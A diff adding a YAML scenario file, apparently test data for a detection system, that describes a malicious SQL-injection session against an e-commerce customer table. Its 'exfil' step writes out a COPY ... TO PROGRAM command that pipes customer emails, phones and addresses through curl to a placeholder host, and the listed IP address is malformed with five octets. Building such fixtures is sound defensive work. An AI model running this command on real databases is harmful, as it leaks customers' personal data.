@@ -1,0 +1,32 @@
+scenario_id: gen_ecommerce_75_sql_injection_mal_2238m
+family_id: gen_ecommerce_75_sql_injection_fam_2238
+domain: ecommerce
+time_of_day: 04:35
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: probe
+    sql: SELECT email, phone, shipping_address FROM customers WHERE order_id > 738843
+  - step_id: exfil
+    sql: COPY (SELECT email, phone, shipping_address FROM customers) TO PROGRAM 'curl
+      -sX POST https://clearinghouse-batch.example/ingest -d @-'
+    connects_to:
+      ip: 176.65.48.108.57
+      port: 9443
+matched_pair_id: gen_ecommerce_75_sql_injection_pair_2238
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
